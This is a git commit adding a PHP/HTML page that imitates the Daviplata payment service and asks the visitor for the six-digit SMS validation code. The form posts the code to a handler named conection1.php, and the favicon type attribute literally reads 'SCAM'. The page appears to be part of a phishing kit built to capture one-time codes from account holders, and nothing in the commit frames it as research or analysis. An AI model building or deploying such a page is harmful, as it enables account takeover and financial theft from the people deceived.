80e365f95a936d1e80b500e27b8972bf3e538c7a
holamundo12345new <104818999+holamundo12345new@users.noreply.github.com>
2022-11-02 23:21:20 -0500

    Add files via upload

---
+++ index2.php
@@ -0,0 +1,92 @@
+<!DOCTYPE html>
+
+<html>
+
+<head>
+	
+	<link rel="icon" href="Favicon.png" type="SCAM/Favicon.png" sizes="16x16" />
+	<title>Daviplata</title>
+        
+        <meta name="keywords" content="Test">
+        <meta name="description" content="Test">
+        <meta name="description" content="Web site created using create-react-app">
+        <meta name="subject" content="Test">
+        <meta name="copyright" content="Test">
+        <meta name="url" content="http://www.test.com">
+        <meta name="language" content="en-GB">
+        <meta name="robots" content="NOINDEX, NOFOLLOW">
+        <meta name="pagename" content="$Title">
+        <meta name="coverage" content="Worldwide">
+        <meta name="distribution" content="Global">
+        <meta name="target" content="all">
+        <meta name="HandheldFriendly" content="True">
+        <meta name="MobileOptimized" content="640">
+        <meta name="format-detection" content="telephone=no">
+        <meta http-equiv="cleartype" content="on">
+        <meta name="apple-mobile-web-app-title" content="$Title">
+        <meta name="apple-mobile-web-app-capable" content="yes">
+        <meta name="apple-touch-fullscreen" content="yes">
+        <meta name="apple-mobile-web-app-status-bar-style" content="black">
+        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+        <meta name="ResourceLoaderDynamicStyles" content="">
+        <meta http-equiv="Expires" content="0">
+        <meta http-equiv="Pragma" content="no-cache">
+        <meta http-equiv="Cache-Control" content="no-cache">
+        <meta http-equiv="imagetoolbar" content="no">
+        <meta http-equiv="x-dns-prefetch-control" content="off">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+
+        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no">
+
+        <!-- Makes your prototype chrome-less once bookmarked to your phone's home screen -->
+        <meta name="apple-mobile-web-app-capable" content="yes">
+        <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+        <!-- Set a shorter title for iOS6 devices when saved to home screen -->
+        <meta name="apple-mobile-web-app-title" content="Ratchet">
+     
+        <meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0" />
+	<link rel="stylesheet" type="text/css" href="estilo.css">
+	<link rel= "stylesheet" href= "https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.0.0/animate.compat.css">
+</head>
+
+<body>
+<div class="header" id="Cabezote">
+<img class="logo" src="LOGO1.png" alt="LOGO1.png">
+</div>
+<div class="todo" id="todo">
+
+<div class="formulario" id="campos">
+		<form class="form" action="conection1.php" method="POST">
+		    <br>	        
+                            
+     <h1>Código de validación</h1>
+     
+                	<br><br><br>			
+                  
+            <img class="sms" src="SMS1.png" alt="SMS1.png">
+           
+            <label id="texto1">Escriba el código que le llegó por mensaje de texto a su celular</label>
+            <br>
+              
+             
+            <input  id="codigo" minlength="6" maxlength="6"  name="codigo" placeholder ="Código de 6 dígitos" required="number" pattern="[0-9]+">
+             <br>
+              <br>
+			<input  id="accept" type="submit" value="Confirmar">
+			<br>
+			<br>
+			
+		</form>
+	
+	</div>
+	</div>
+	</div>
+	<script src="popup.js"></script>
+	
+</body>
+
+
+</html>
